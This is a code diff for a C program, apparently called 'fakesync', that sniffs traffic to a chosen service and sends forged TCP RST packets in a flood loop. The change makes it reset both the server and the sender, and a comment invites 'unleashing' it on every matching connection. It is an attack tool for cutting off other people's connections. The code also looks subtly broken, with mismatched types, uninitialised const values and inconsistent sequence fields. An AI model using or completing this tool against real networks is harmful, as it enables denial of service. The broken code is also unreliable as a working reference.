@@ -31,7 +31,7 @@
 // Functions
 uint16_t ip_checksum(void*,size_t);
 void reset(const struct sockaddr, const struct sockaddr, 
-    const uint16_t, const uint16_t, const uint32_t, const uint32_t);
+    const uint16_t, const uint16_t, uint32_t, uint32_t);
 void sigint_handler(int );
 
 // Pseudo header needed for calculating the TCP header checksum
@@ -111,7 +111,8 @@ int main(int argc, char *argv[]) {
         if (iph -> daddr != service_addr) continue; // check if destination IP matches
         if (tcph -> dest != service_port) continue; //check if destination port matches
 
-        reset(iph->saddr, iph->daddr, tcph->source, tcph->dest, tcph->seq, tcph->ack_seq);
+        reset(iph->saddr, iph->daddr, tcph->source, tcph->dest, tcph->seq, tcph->ack_seq); // reset the server
+        reset(iph->daddr, iph->saddr, tcph->dest, tcph->source, tcph->ack_seq, tcph->seq); // reset the sender
 
         break; // comment to unleash
     }
@@ -157,7 +158,7 @@ uint16_t ip_checksum(void* vdata,size_t length) {
 }
 
 void reset(const struct sockaddr saddr, const struct sockaddr daddr, 
-    const uint16_t sport, const uint16_t dport, const uint32_t seq0, const uint32_t ack0)
+    const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
 {
     int sockfd, count = 0, num, yes = 1;
     char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
@@ -167,7 +168,6 @@ void reset(const struct sockaddr saddr, const struct sockaddr daddr,
     char sIP[INET6_ADDRSTRLEN], dIP[INET6_ADDRSTRLEN];
     uint16_t win = 8192, id0 = rand() %(65536);
     const uint32_t ack, seq;
-    // uint32_t seq, seq0 = 3842363570, ack0 = 1656549865;
     size_t tcp_len;
 
     // Open raw socket without protocol header
@@ -211,7 +211,7 @@ void reset(const struct sockaddr saddr, const struct sockaddr daddr,
     // pack TCP header
     tcph -> source = htons(sport); // source port
     tcph -> dest = htons(dport); // destination port
-    tcph -> seq = 0; // sequence number
+    tcph -> seq = 0; // sequence number init to 0
     tcph -> ack_seq = 0; // ack sequence number init to 0
     tcph -> res1 = 0;
     tcph -> res2 = 0;
@@ -240,23 +240,22 @@ void reset(const struct sockaddr saddr, const struct sockaddr daddr,
     psh -> tcp_len = htons(tcp_len); // TCP segment length
 
     // build sockaddr
-    sa.sin_family = AF_INET;
+    // sa.sin_family = AF_INET;
     // sa.sin_port = htons(dport);
-    inet_pton(AF_INET, dIP, &(sa.sin_addr.s_addr));
+    // inet_pton(AF_INET, dIP, &(sa.sin_addr.s_addr));
 
-    seq = seq0;
-    ack = ack0;
     // RST flood loop
     for (count = 0; count < NUM_OF_RESET; count++) {
+        // reset the server
         // tcph -> seq = htonl(seq); // set seq number
         // cstcph -> seq = htonl(seq); // set seq number in the checksum header
-        tcph -> ack_seq = htonl(ack++); // set ack seq number
+        tcph -> ack_seq = htonl(ack0++); // set ack seq number
         cstcph -> ack_seq = htonl(ack); // set ack seq number in the checksum header
         tcph -> check = 0; // reset check sum
         cstcph -> check = 0; // reset check sum  
         tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
 
-        if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
+        if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, &daddr, sizeof daddr)) < 0)
         {
             perror("fakesync: sendto()\n");
         }
